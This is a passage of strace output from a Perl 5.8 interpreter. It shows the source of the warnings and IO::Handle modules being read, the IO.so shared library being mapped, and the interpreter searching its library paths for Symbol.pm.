\"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
5779  07:10:39.102613 brk(0x81b6000)    = 0x81b6000
5779  07:10:39.102629 brk(0x81b5000)    = 0x81b5000
5779  07:10:39.102707 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
5779  07:10:39.103170 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
5779  07:10:39.103927 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
5779  07:10:39.104088 read(8, "", 4096) = 0
5779  07:10:39.104102 close(8)          = 0
5779  07:10:39.104289 _llseek(6, 412, [412], SEEK_SET) = 0
5779  07:10:39.104359 _llseek(6, 0, [412], SEEK_CUR) = 0
5779  07:10:39.104388 close(6)          = 0
5779  07:10:39.104471 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5779  07:10:39.104495 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5779  07:10:39.104524 futex(0xb7ef5070, 0x81 /* FUTEX_??? */, 2147483647) = 0
5779  07:10:39.104540 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
5779  07:10:39.104555 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5779  07:10:39.104664 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5779  07:10:39.104690 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7ef9000
5779  07:10:39.104703 mmap2(0xb7efd000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7efd000
5779  07:10:39.104717 close(6)          = 0
5779  07:10:39.104963 stat64("/etc/perl/IO/Handle.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.104986 stat64("/etc/perl/IO/Handle.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105005 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105023 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105042 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105060 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105086 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105103 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105121 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105138 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105156 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.105174 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
5779  07:10:39.105203 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.105223 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.105238 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.105259 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
5779  07:10:39.106413 stat64("/etc/perl/Symbol.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106432 stat64("/etc/perl/Symbol.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106445 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106458 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106472 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106484 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106498 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106509 stat64("/usr/lib/perl5/Symbol.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106523 stat64("/usr/share/perl5/Symbol.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.106534 stat64("/usr/share/perl5/Symbol.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
